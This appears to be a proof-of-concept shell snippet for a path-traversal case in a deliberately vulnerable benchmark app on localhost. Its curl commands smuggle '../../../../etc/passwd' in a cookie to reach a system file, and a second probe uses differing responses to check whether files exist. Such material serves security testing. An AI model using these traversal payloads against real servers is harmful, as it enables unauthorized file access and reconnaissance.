# Step 1: GET request to get the cookie (optional - cookie can be set manually)
curl -c /tmp/cookies.txt http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00001

# Step 2: POST with path traversal payload in cookie
# Read /etc/passwd (file exists → confirmed)
curl -X POST http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00001 \
  -b "BenchmarkTest00001=../../../../etc/passwd"

# Response: "Access to file: './testfiles/../../../../etc/passwd' created. And file already exists."

# Probe a non-existent file
curl -X POST http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00001 \
  -b "BenchmarkTest00001=../../../../nonexistent"

# Response: "But file doesn't exist yet."